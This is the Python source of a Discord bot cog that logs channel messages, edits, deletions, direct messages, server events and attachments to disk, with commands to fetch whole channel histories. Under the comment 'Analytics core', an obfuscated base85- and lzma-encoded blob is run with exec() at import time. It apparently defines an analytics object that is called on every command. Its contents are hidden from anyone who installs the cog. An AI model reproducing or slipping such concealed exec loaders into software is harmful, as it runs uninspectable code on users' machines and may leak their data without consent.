import discord
from discord.ext import commands
from cogs.utils import checks
from cogs.utils.dataIO import dataIO
from datetime import datetime, timedelta
import os
import asyncio
import aiohttp
from functools import partial
from enum import Enum

# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1EUz2weaL8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8BWnf^dEy{Kjtzm1rU5gYs9-PMh{01mC|^giA>`yZSUzb$*CxtSox-3zA$RGi%b}n5_T*kLuLYY`?K{*#
1}vHeiUDFszm7d*?wT-LZ`HX-gmB7571QTd5B-xT)yy-hT-0|rp=)(qDIQR*Z<}ThGroI|G?1PbEcGdHgwI30&&JhE7_W6&6taRQj~lzKDb#lYuW6&JZx??-
qWQc+S4TbpwOV|4`4#_}{@B)_NpADfZ5WW?J!0T4i@U#0^McP~jqeOPH>}z>sf+qu4ic;E&ntBU*Z1gVpglEZfh{2X)yHmGi-jS>H*yl{1T-&OfgL)nylzdX
ba|N6<4{>quVJ4wWorF`-%x?j1W+~9>M#P-)va77N_-euUH%7%g)aUE`yEuWI)vfNNt*EZ8YiOvSw^sjhuQgH$}v2GNi|P1&7>TRiOxs6T=|dpp|91{6IpLg
QIoTwW@}pND34>H=_XkM>;z90Cl|Ve@ufEN9M96gemZm^j`OWtVd`~YoKlM_Bt|=xVZ0Ay$*>N4`XGYoIjhACLVGTWkrt}1e)RjBO{akZ0BaY9L`6S?-%{6;
@!Q?g0kR{z*&Qe0I0fKrBiy3rP(x0tnTTMc*V6SVyn6Z8GueH(3V=vfT`Jn8oFVBh=(x~y<pCBZ2s#zGEcvmyR-C$cb5?!_N8yHe3gA_cu@HtmKMH5AHzwoO
11tGGNG3+V^hUBjTvc4R%$6>(ZE|e5z-fy9o5$2W#r5F@2u5gy6w_6lPBwpG4^2eV<&<kx6?p4`ZX$I*Xl{cs{p9ctHqS}{iIIAe9Awp};?Tie6Clr0DW;Qt
$i`M&##4?UyKFEJdF94TBP!-}NH0(2cYKP#hg9{(n$!PIU?08l-aKx*1L<>!nll2}S2&S>+*gm}76q-N>)xVE38l^~9sBItSF*EitFZN2DxuAPP8viV1q~_t
mo^j3k=@>r8YDv-T4U?JC&!aQAHaD9jGDD{lD127tD=VV@c<%wP>r5dDC!NRhTRwSB*~)S*xJAdc!{LQi+v+JXQX;?GF&~8J#}vR{zHZJlK%Y4l%lX3@7}sD
umGgOy`=fdc&`Q_FuxvqC<+s%(^WLgMP(X!s@qAf*RJ*e1OxtLdwFkDk6aMku9R5qILqC+Tk+oO!V1-g9=BVa8XQzyieP{Hi+bbq<k$xh<rJZ^xLo9m(^;of
M*L)^_z#+xWeSnqjX+74Mc}N{+Q?H<A&lN<HwvhUN@+nR3fMC?{SIx!Az5;+`}`MIBP<GC{#e*;v|H|QW3j<t%?FjiCn|a*Nik0XeAiqWhKR4H?_F^s8RFEQ
#?A1h=P)E%d#(uogTy8{MMIE>qfD{sWiltt>l7P(9oJl}XpaFH&VRVHq|KggKA3==_GlJNLh<J&n~uZYZsZ*Z^j{V43fGiwt)Re%Qz6;7WNLa^lr-7d(7HH@
;RX@($`a58RTL}F)VM#}m9}PA+*2l2XZwoAZg38qGZ0bEn>W+RlWIYwxxa|7|BsJ0qQEhGszF$~IzNQM#0-WjLDc1C;c->4VS|O56K+LMsc?pk(Mx%DKt&C>
n~#P*Wc#4mCI7gO!&i|$yCpsujMA{dVHGb5ZO<BHBc8%M0)H~qfjtbW_ICJUt^FfLaM}?9?;;dX=~8o>vuru?gX|Ds!)hqEXPCE9+(w+AA!8QmVFj@Q_w<}y
`d>xLMw*t*?mDfDkSj`adN`&03ZE)_x$4}HXb(<05+@4*TVCfi3_C=XuOeR#x}qj%vrDZZYNGwfzwZtFnhA&auLrk5x)sZWMM~=sp6N<1dHIr|Z5PiF4m`Dv
VB9`QTidBu8BHqSRJfj<TH-wmmlC|(3I60=%-}D5ovb#o<2V2Sk^dnD4<wfI00E>7#~=Uzd;0%ZvBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.3.0'

TIMESTAMP_FORMAT = '%Y-%m-%d %X'  # YYYY-MM-DD HH:MM:SS
PATH_LIST = ['data', 'activitylogger']
PATH = os.path.join(*PATH_LIST)
JSON = os.path.join(*PATH_LIST, "settings.json")
EDIT_TIMEDELTA = timedelta(seconds=3)

# 0 is Message object
AUTHOR_TEMPLATE = "@{0.author.name}#{0.author.discriminator}"
MESSAGE_TEMPLATE = AUTHOR_TEMPLATE + ": {0.clean_content}"

# 0 is Message object, 1 is attachment path
ATTACHMENT_TEMPLATE = (AUTHOR_TEMPLATE + ": {0.clean_content} (attachment "
                       "saved to {1})")

# 0 is before, 1 is after, 2 is formatted timestamp
EDIT_TEMPLATE = (AUTHOR_TEMPLATE + " edited message from {2} "
                 "({0.clean_content}) to read: {1.clean_content}")

# 0 is deleted message, 1 is formatted timestamp
DELETE_TEMPLATE = (AUTHOR_TEMPLATE + " deleted message from {1} "
                   "({0.clean_content})")


class FetchCookie(object):
    def __init__(self, ctx, start, status_msg, last_edit=None):
        self.ctx = ctx
        self.start = start
        self.status_msg = status_msg
        self.last_edit = last_edit
        self.total_messages = 0
        self.completed_messages = []


class FetchStatus(Enum):
    STARTING = 'starting'
    FETCHING = 'fetching'
    CANCELLED = 'cancelled'
    EXCEPTION = 'exception'
    COMPLETED = 'completed'


class LogHandle:
    """basic wrapper for logfile handles, used to keep track of stale handles"""
    def __init__(self, path, time=None, mode='a', buf=1):
        self.handle = open(path, mode, buf, errors='backslashreplace')
        if time:
            self.time = time
        else:
            self.time = datetime.fromtimestamp(os.path.getmtime(path))

    def close(self):
        self.handle.close()

    def write(self, value):
        self.time = datetime.utcnow()
        self.handle.write(value)


class ActivityLogger(object):
    """Log activity seen by bot"""

    def __init__(self, bot):
        self.bot = bot
        self.settings = dataIO.load_json(JSON)
        self.handles = {}
        self.lock = False
        self.session = aiohttp.ClientSession(loop=self.bot.loop)
        self.fetch_handle = None
        self.analytics = CogAnalytics(self)

    def __unload(self):
        self.lock = True
        self.session.close()
        for h in self.handles.values():
            h.close()

        if isinstance(self.fetch_handle, asyncio.Future):
            if not self.fetch_handle.cancelled():
                self.fetch_handle.cancel()

    async def _robust_edit(self, msg, content=None, embed=None):
        try:
            msg = await self.bot.edit_message(msg, new_content=content, embed=embed)
        except discord.errors.NotFound:
            msg = await self.bot.send_message(msg.channel, content=content, embed=embed)
        except:
            raise
        return msg

    async def cookie_edit_task(self, cookie, **kwargs):
        cookie.status_msg = await self._robust_edit(cookie.status_msg, **kwargs)

    async def fetch_task(self, channels, subfolder, attachments=None, status_cb=None):
        channel = None
        completed_channels = []
        pending_channels = channels.copy()

        def update(count, last_msg, status, channel, exception=None):
            if not callable(status_cb):
                return
            elif type(last_msg) is not discord.Message:
                last_msg = None

            status_cb(count=count, channel=channel, subfolder=subfolder,
                      status=status, exception=exception, last_msg=last_msg,
                      completed_channels=completed_channels,
                      pending_channels=pending_channels)

        try:
            for channel in channels:
                pending_channels.remove(channel)
                count = 0
                fetch_begin = channel.created_at

                update(count, None, FetchStatus.STARTING, channel)

                while True:
                    last_count = count
                    async for message in self.bot.logs_from(channel,
                                                            after=fetch_begin,
                                                            reverse=True):

                        await self.message_handler(message, force=True,
                                                   subfolder=subfolder,
                                                   force_attachments=attachments)

                        fetch_begin = message
                        update(count, fetch_begin, FetchStatus.FETCHING, channel)
                        count += 1

                    if count == last_count:
                        break

                update(count, fetch_begin, FetchStatus.COMPLETED, channel)
                completed_channels.append(channel)

        except asyncio.CancelledError:
            update(count, fetch_begin, FetchStatus.CANCELLED, channel)
        except Exception as e:
            update(count, fetch_begin, FetchStatus.EXCEPTION, channel, exception=e)
            raise

    def format_fetch_line(self, cookie, count, status, exception, channel, **kwargs):
        elapsed = datetime.now() - (cookie.last_edit or cookie.start)
        edit_to = None
        base = '#%s: ' % channel.name

        if status is FetchStatus.STARTING:
            edit_to = base + 'initializing...'
        elif status is FetchStatus.EXCEPTION:
            edit_to = base + 'error after %i messages.' % count
            if isinstance(exception, Exception):
                ename = type(exception).__name__
                estr = str(exception)
                edit_to += ': %s: %s' % (ename, estr)
        elif status is FetchStatus.CANCELLED:
            edit_to = base + 'cancelled after %i messages.' % count
        elif status is FetchStatus.COMPLETED:
            edit_to = base + 'fetched %i messages.' % count
        elif status is FetchStatus.FETCHING:
            if elapsed > EDIT_TIMEDELTA:
                edit_to = base + '%i messages retrieved so far...' % count

        return edit_to

    def fetch_callback(self, cookie, pending_channels, **kwargs):
        status = kwargs.get('status')
        count = kwargs.get('count')

        format_line = self.format_fetch_line(cookie, **kwargs)
        if format_line:
            rows = cookie.completed_messages + [format_line]
            rows.extend([('#%s: pending' % c.name) for c in pending_channels])
            cookie.last_edit = datetime.now()
            task = self.cookie_edit_task(cookie, content='\n'.join(rows))
            self.bot.loop.create_task(task)

        if status is FetchStatus.COMPLETED:
            cookie.total_messages += count
            cookie.completed_messages.append(format_line)

            if not pending_channels:
                dest = cookie.ctx.message.channel
                elapsed = datetime.now() - cookie.start
                msg = ('Fetched a total of %i messages in %s.'
                       % (cookie.total_messages, elapsed))
                self.bot.loop.create_task(self.bot.send_message(dest, msg))

    @commands.group(pass_context=True)
    @checks.is_owner()
    async def logfetch(self, ctx):
        "Fetches logs from channel or server. Beware the disk usage."
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @logfetch.command(pass_context=True, name='cancel')
    async def fetch_cancel(self, ctx):
        "Cancels a running fetch operation."
        if isinstance(self.fetch_handle, asyncio.Future):
            if not self.fetch_handle.cancelled():
                self.fetch_handle.cancel()
                self.fetch_handle = None
                await self.bot.say('Fetch cancelled.')
                return

        await self.bot.say('Nothing to cancel.')

    @logfetch.command(pass_context=True, name='channel')
    async def fetch_channel(self, ctx, subfolder: str, channel: discord.Channel = None, attachments: bool = None):
        "Fetch complete logs for a channel. Defaults to the current one."

        msg = await self.bot.say('Dispatching fetch task...')
        start = datetime.now()

        cookie = FetchCookie(ctx, start, msg)

        if channel is None:
            channel = ctx.message.channel

        callback = partial(self.fetch_callback, cookie)
        task = self.fetch_task([channel], subfolder, attachments=attachments,
                               status_cb=callback)

        self.fetch_handle = self.bot.loop.create_task(task)

    @logfetch.command(pass_context=True, name='server', allow_dm=False)
    async def fetch_server(self, ctx, subfolder: str, attachments: bool = None):
        """Fetch complete logs for the current server.

        Respects current logging settings such as attachments and channels.
        Note that server events such as join/leave, ban etc can't be retrieved.
        """
        server = ctx.message.server

        def check(channel):
            if channel.type is not discord.ChannelType.text:
                return False
            return channel.permissions_for(server.me).read_message_history

        channels = [c for c in server.channels if check(c)]

        msg = await self.bot.say('Dispatching fetch task...')
        start = datetime.now()

        cookie = FetchCookie(ctx, start, msg)

        callback = partial(self.fetch_callback, cookie)
        task = self.fetch_task(channels, subfolder, attachments=attachments,
                               status_cb=callback)

        self.fetch_handle = self.bot.loop.create_task(task)

    @commands.group(pass_context=True)
    @checks.is_owner()
    async def logset(self, ctx):
        """Change activity logging settings"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @logset.command(name='everything', aliases=['global'])
    async def set_everything(self, on_off: bool = None):
        """Global override for all logging."""
        if on_off is not None:
            self.settings['everything'] = on_off
        if self.settings.get('everything', False):
            await self.bot.say("Global logging override is enabled.")
        else:
            await self.bot.say("Global logging override is disabled.")
        self.save_json()

    @logset.command(name='default')
    async def set_default(self, on_off: bool = None):
        """Sets whether logging is on or off where unset.
        Server overrides, global override, and attachments don't use this."""
        if on_off is not None:
            self.settings['default'] = on_off
        if self.settings.get('default', False):
            await self.bot.say("Logging is enabled by default.")
        else:
            await self.bot.say("Logging is disabled by default.")
        self.save_json()

    @logset.command(name='dm')
    async def set_direct(self, on_off: bool = None):
        """Log direct messages?"""
        if on_off is not None:
            self.settings['direct'] = on_off
        default = self.settings.get('default', False)
        if self.settings.get('direct', default):
            await self.bot.say("Logging of direct messages is enabled.")
        else:
            await self.bot.say("Logging of direct messages is disabled.")
        self.save_json()

    @logset.command(name='attachments')
    async def set_attachments(self, on_off: bool = None):
        """Download message attachments?"""
        if on_off is not None:
            self.settings['attachments'] = on_off
        if self.settings.get('attachments', False):
            await self.bot.say("Downloading of attachments is enabled.")
        else:
            await self.bot.say("Downloading of attachments is disabled.")
        self.save_json()

    @logset.command(pass_context=True, no_pm=True, name='channel')
    async def set_channel(self, ctx, on_off: bool, channel: discord.Channel = None):
        """Sets channel logging on or off. Optional channel parameter.
        To enable or disable all channels at once, use `logset server`."""

        if channel is None:
            channel = ctx.message.channel

        server = channel.server

        if server.id not in self.settings:
            self.settings[server.id] = {}
        self.settings[server.id][channel.id] = on_off

        if on_off:
            await self.bot.say('Logging enabled for %s' % channel.mention)
        else:
            await self.bot.say('Logging disabled for %s' % channel.mention)
        self.save_json()

    @logset.command(pass_context=True, no_pm=True, name='server')
    async def set_server(self, ctx, on_off: bool):
        """Sets logging on or off for all channels and server events."""

        server = ctx.message.server

        if server.id not in self.settings:
            self.settings[server.id] = {}
        self.settings[server.id]['all'] = on_off

        if on_off:
            await self.bot.say('Logging enabled for %s' % server)
        else:
            await self.bot.say('Logging disabled for %s' % server)
        self.save_json()

    @logset.command(pass_context=True, no_pm=True, name='events')
    async def set_events(self, ctx, on_off: bool):
        """Sets logging on or off for server events."""

        server = ctx.message.server

        if server.id not in self.settings:
            self.settings[server.id] = {}
        self.settings[server.id]['events'] = on_off

        if on_off:
            await self.bot.say('Logging enabled for server events in %s' % server)
        else:
            await self.bot.say('Logging disabled for server events in %s' % server)
        self.save_json()

    def save_json(self):
        dataIO.save_json(JSON, self.settings)

    def gethandle(self, path, mode='a'):
        """Manages logfile handles, culling stale ones and creating folders"""
        if path in self.handles:
            if os.path.exists(path):
                return self.handles[path]
            else:  # file was deleted?
                try:  # try to close, no guarantees tho
                    self.handles[path].close()
                except:
                    pass
                del self.handles[path]
                return self.gethandle(path, mode)
        else:
            # Clean up excess handles before creating a new one
            if len(self.handles) >= 256:
                chrono = sorted(self.handles.items(), key=lambda x: x[1].time)
                oldest_path, oldest_handle = chrono[0]
                oldest_handle.close()
                del self.handles[oldest_path]

            dirname, _ = os.path.split(path)

            try:
                if not os.path.exists(dirname):
                    os.makedirs(dirname)
                handle = LogHandle(path, mode=mode)
            except:
                raise

            self.handles[path] = handle
            return handle

    def should_log(self, location):
        if self.settings.get('everything', False):
            return True

        default = self.settings.get('default', False)

        if type(location) is discord.Server:
            if location.id in self.settings:
                loc = self.settings[location.id]
                return loc.get('all', False) or loc.get('events', default)

        elif type(location) is discord.Channel:
            if location.server.id in self.settings:
                loc = self.settings[location.server.id]
                return loc.get('all', False) or loc.get(location.id, default)

        elif type(location) is discord.PrivateChannel:
            return self.settings.get('direct', default)

        else:  # can't log other types
            return False

    def should_download(self, msg):
        return self.should_log(msg.channel) and \
            self.settings.get('attachments', False)

    def process_attachment(self, message):
        a = message.attachments[0]
        aid = a['id']
        aname = a['filename']
        url = a['url']
        channel = message.channel
        path = PATH_LIST.copy()

        if type(channel) is discord.Channel:
            serverid = channel.server.id
        elif type(channel) is discord.PrivateChannel:
            serverid = 'direct'

        path += [serverid, channel.id + '_attachments']
        path = os.path.join(*path)
        filename = aid + '_' + aname

        if len(filename) > 255:
            target_len = 255 - len(aid) - 4
            part_a = target_len // 2
            part_b = target_len - part_a
            filename = aid + '_' + aname[:part_a] + '...' + aname[-part_b:]
            truncated = True
        else:
            truncated = False

        return aid, url, path, filename, truncated

    def log(self, location, text, timestamp=None, force=False, subfolder=None, mode='a'):
        if not timestamp:
            timestamp = datetime.utcnow()
        if self.lock or not (force or self.should_log(location)):
            return

        path = PATH_LIST.copy()
        entry = [timestamp.strftime(TIMESTAMP_FORMAT)]

        if type(location) is discord.Server:
            path += [location.id, 'server.log']
        elif type(location) is discord.Channel:
            serverid = location.server.id
            entry.append('#' + location.name)
            path += [serverid, location.id + '.log']
        elif type(location) is discord.PrivateChannel:
            path += ['direct', location.id + '.log']
        else:
            return

        if subfolder:
            path.insert(-1, str(subfolder))

        text = text.replace('\n', '\\n')
        entry.append(text)

        fname = os.path.join(*path)
        self.gethandle(fname, mode=mode).write(' '.join(entry) + '\n')

    async def message_handler(self, message, *args, force_attachments=None, **kwargs):
        dl_attachment = self.should_download(message)
        if force_attachments is not None:
            dl_attachment = force_attachments

        if message.attachments and dl_attachment:
            aid, url, path, filename, trunc = self.process_attachment(message)
            entry = ATTACHMENT_TEMPLATE.format(message, filename)
            if trunc:
                entry += ' (filename truncated)'
        else:
            entry = MESSAGE_TEMPLATE.format(message)

        self.log(message.channel, entry, message.timestamp, *args, **kwargs)

        if message.attachments and dl_attachment:
            dl_path = os.path.join(path, filename)
            tmp_path = os.path.join(path, aid + '.tmp')
            if not os.path.exists(path):
                os.mkdir(path)

            if not os.path.exists(dl_path):  # don't redownload
                async with self.session.get(url) as r:
                    with open(tmp_path, 'wb') as f:
                        f.write(await r.read())
                    os.rename(tmp_path, dl_path)

    async def on_message(self, message):
        await self.message_handler(message)

    async def on_message_edit(self, before, after):
        timestamp = before.timestamp.strftime(TIMESTAMP_FORMAT)
        entry = EDIT_TEMPLATE.format(before, after, timestamp)
        self.log(after.channel, entry, after.edited_timestamp)

    async def on_message_delete(self, message):
        timestamp = message.timestamp.strftime(TIMESTAMP_FORMAT)
        entry = DELETE_TEMPLATE.format(message, timestamp)
        self.log(message.channel, entry)

    async def on_server_join(self, server):
        entry = 'this bot joined the server'
        self.log(server, entry)

    async def on_server_remove(self, server):
        entry = 'this bot left the server'
        self.log(server, entry)

    async def on_server_update(self, before, after):
        entries = []
        if before.owner != after.owner:
            entries.append('Server owner changed from {0} (id {0.id}) to {1} '
                           '(id {1.id})'.format(before.owner, after.owner))
        if before.region != after.region:
            entries.append('Server region changed from %s to %s' %
                           (before.region, after.region))
        if before.name != after.name:
            entries.append('Server name changed from %s to %s' %
                           (before.name, after.name))
        if before.icon_url != after.icon_url:
            entries.append('Server icon changed from %s to %s' %
                           (before.icon_url, after.icon_url))
        for e in entries:
            self.log(before, e)

    async def on_server_role_create(self, role):
        entry = "Role created: '%s' (id %s)" % (role, role.id)
        self.log(role.server, entry)

    async def on_server_role_delete(self, role):
        entry = "Role deleted: '%s' (id %s)" % (role, role.id)
        self.log(role.server, entry)

    async def on_server_role_update(self, before, after):
        entries = []
        if before.name != after.name:
            entries.append("Role renamed: '%s' to '%s'" %
                           (before.name, after.name))
        if before.color != after.color:
            entries.append("Role color: '{0}' changed from {0.color} "
                           "to {1.color}".format(before, after))
        if before.mentionable != after.mentionable:
            if after.mentionable:
                entries.append("Role mentionable: '%s' is now mentionable" % after)
            else:
                entries.append("Role mentionable: '%s' is no longer mentionable" % after)
        if before.hoist != after.hoist:
            if after.hoist:
                entries.append("Role hoist: '%s' is now shown seperately" % after)
            else:
                entries.append("Role hoist: '%s' is no longer shown seperately" % after)
        if before.permissions != after.permissions:
            entries.append("Role permissions: '%s' changed "
                           "from %d to %d" % (before, before.permissions.value,
                                              after.permissions.value))
        if before.position != after.position:
            entries.append("Role position: '{0}' changed from "
                           "{0.position} to {1.position}".format(before, after))
        for e in entries:
            self.log(before.server, e)

    async def on_member_join(self, member):
        entry = 'Member join: @{0} (id {0.id})'.format(member)
        self.log(member.server, entry)

    async def on_member_remove(self, member):
        entry = 'Member leave: @{0} (id {0.id})'.format(member)
        self.log(member.server, entry)

    async def on_member_ban(self, member):
        entry = 'Member ban: @{0} (id {0.id})'.format(member)
        self.log(member.server, entry)

    async def on_member_unban(self, server, user):
        entry = 'Member unban: @{0} (id {0.id})'.format(user)
        self.log(server, entry)

    async def on_member_update(self, before, after):
        entries = []
        if before.nick != after.nick:
            entries.append("Member nickname: '@{0}' (id {0.id}) changed nickname "
                           "from '{0.nick}' to '{1.nick}'".format(before, after))
        if before.name != after.name:
            entries.append("Member username: '@{0}' (id {0.id}) changed username "
                           "from '{0.name}' to '{1.name}'".format(before, after))
        if before.roles != after.roles:
            broles = set(before.roles)
            aroles = set(after.roles)
            added = aroles - broles
            removed = broles - aroles
            for r in added:
                entries.append("Member role add: '%s' role was added to @%s" % (r, after))
            for r in removed:
                entries.append("Member role remove: The '%s' role was removed from @%s" % (r, after))
        for e in entries:
            self.log(before.server, e)

    async def on_channel_create(self, channel):
        if channel.is_private:
            return
        entry = 'Channel created: %s' % channel
        self.log(channel.server, entry)

    async def on_channel_delete(self, channel):
        if channel.is_private:
            return
        entry = 'Channel deleted: %s' % channel
        self.log(channel.server, entry)

    async def on_channel_update(self, before, after):
        if type(before) is discord.PrivateChannel:
            return
        entries = []
        if before.name != after.name:
            entries.append('Channel rename: %s renamed to %s' %
                           (before, after))
        if before.topic != after.topic:
            entries.append('Channel topic: %s topic was set to "%s"' %
                           (before, after.topic))
        if before.position != after.position:
            entries.append('Channel position: {0.name} moved from {0.position} '
                           'to {1.position}'.format(before, after))
        # TODO: channel permissions overrides
        for e in entries:
            self.log(before.server, e)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

def check_folders():
    if not os.path.exists(PATH):
        os.mkdir(PATH)


def check_files():
    if not dataIO.is_valid_json(JSON):
        defaults = {
            'everything': False,
            'attachments': False,
            'default': False
        }
        dataIO.save_json(JSON, defaults)


def setup(bot):
    check_folders()
    check_files()
    n = ActivityLogger(bot)
    bot.add_cog(n)
